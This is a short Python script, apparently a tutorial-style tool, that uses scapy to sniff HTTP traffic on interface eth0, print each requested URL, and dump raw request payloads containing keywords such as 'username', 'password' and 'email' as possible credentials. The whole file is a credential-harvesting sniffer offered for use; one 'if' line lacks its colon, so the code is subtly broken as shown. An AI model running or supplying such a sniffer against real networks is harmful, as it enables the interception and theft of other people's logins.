#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface = interface, store = False, prn = process_sniff_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw)
        load = str (packet[scapy.Raw].load)
        keywords = ["username", "user", "password", "name", "email", "pass", "login"]
        for keyword in keywords:
            if keyword in load:
                return load
def process_sniff_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >>> " + str(url))

        usr_pass = get_login_info(packet)
        if usr_pass:
            print("\n\n[+] Possible Username/Password >>" + usr_pass + "\n\n")
sniff("eth0")